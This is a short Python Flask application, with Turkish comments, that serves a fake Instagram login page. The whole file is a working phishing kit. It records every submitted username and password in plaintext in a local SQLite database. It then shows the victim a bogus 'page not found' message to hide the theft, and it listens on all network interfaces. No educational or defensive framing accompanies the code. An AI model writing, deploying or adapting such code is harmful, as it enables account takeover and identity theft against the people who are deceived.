from flask import Flask, request, render_template, redirect, url_for
import sqlite3

app = Flask(__name__)

# Veri tabanı bağlantısı ve tablo oluşturma
def init_db():
    with sqlite3.connect('users.db') as conn:
        conn.execute('CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT)')

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
        <head>
            <title>Instagram - Giriş Yap</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #fafafa;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-container {
                    width: 300px;
                    padding: 20px;
                    background-color: #fff;
                    border: 1px solid #ddd;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                    text-align: center;
                }
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ccc;
                    border-radius: 4px;
                }
                button {
                    width: 100%;
                    padding: 10px;
                    background-color: #3897f0;
                    color: #fff;
                    border: none;
                    border-radius: 4px;
                    font-weight: bold;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #2874c4;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Instagram</h2>
                <form action="/login" method="POST">
                    <input type="text" name="username" placeholder="Kullanıcı Adı" required>
                    <input type="password" name="password" placeholder="Şifre" required>
                    <button type="submit">Giriş Yap</button>
                </form>
            </div>
        </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # Kullanıcı giriş bilgilerini veri tabanına ekle
    with sqlite3.connect('users.db') as conn:
        conn.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))

    return '''
    <!DOCTYPE html>
    <html>
        <head>
            <title>404 Not Found</title>
        </head>
        <body>
            <h1>Sayfa Bulunamadı</h1>
            <p>Aradığınız sayfa mevcut değil.</p>
        </body>
    </html>
    ''', 404

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)